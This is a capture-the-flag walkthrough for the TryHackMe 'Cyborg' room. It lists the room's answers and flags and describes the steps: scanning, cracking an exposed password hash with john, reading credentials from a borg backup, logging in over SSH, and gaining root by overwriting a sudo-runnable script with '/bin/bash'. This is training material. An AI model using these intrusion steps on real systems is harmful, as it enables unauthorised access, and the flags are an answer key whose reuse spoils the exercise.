<!-- CTF ROOM  -->
# Cyborg - TryHackMe
<!-- Author name  -->
> Keertan Singh, 19 July,2022
 <!-- image  -->
 #
 ![alt Cyborg](/images/5493020.jpg)
#
## Notes:
```
twitter: fieldraccoon
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. = squidward
alex:S3cretP@s3
```
#
## Answer the questions below
<!-- Task 1  -->
#
###  Task 1 - Deploy the machine
- Deploy the machine
```
No answer needed
```
<!-- Task 2  -->
# 
### Task 2 - Compromise the system
- Scan the machine, how many ports are open?
```
2
```
- What service is running on port 22?
```
ssh
```
- What service is running on port 80?
```
http
```
- What is the user.txt flag?
```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```
- What is the root.txt flag?
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
# 
## Step by Step 
- Step 1 - Nmap scan \
You will get all your first 3 question. 
```
nmap -sC -sV -oG initial <your machine ip>
```
- Step - 2 \
Find all directories: 
```
gobuster dir -u http://10.10.66.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
you will get 2 directory: "/etc" and "/admin" . your will find password in hash form at : 
```
http://10.10.66.102/etc/squid/passwd
```
Password in hash form:
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
Save hash in file [hash.txt]. \
Decrypt it with john:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
Password is : "squidward"
- Step - 3 \
Download archieve.tar from:
```
http://10.10.66.102/admin/archive.tar
```
Make new directory for alex's backup:
```
mkdir unpacked
```
Now Mount Alex backup with borg:
use password key:
```
borg mount home/field/dev/final_archive unpacked
```
- Step - 4 \
Go to :
```
cd unpacked/music_archive/home/alex/Documents
```
Now read note.txt file, you will find alex credenitial:
```
alex:S3cretP@s3
```
Login with ssh:
```
ssh alex@10.10.66.102
```
Read user.txt file:
```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
``` 
- Step - 5 - Privilege Escalation  \
check sudo permissions:
```
sudo -l
```
Everyone have permission as root to run "/etc/mp3backups/backup.sh" \
Edit and run this file :
```
chmod 777 /etc/mp3backups/backup.sh
echo "/bin/bash" > /etc/mp3backups/backup.sh
sudo /etc/mp3backups/backup.sh
```
whoooo!! you are root user now. \
Read root.txt.
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
#
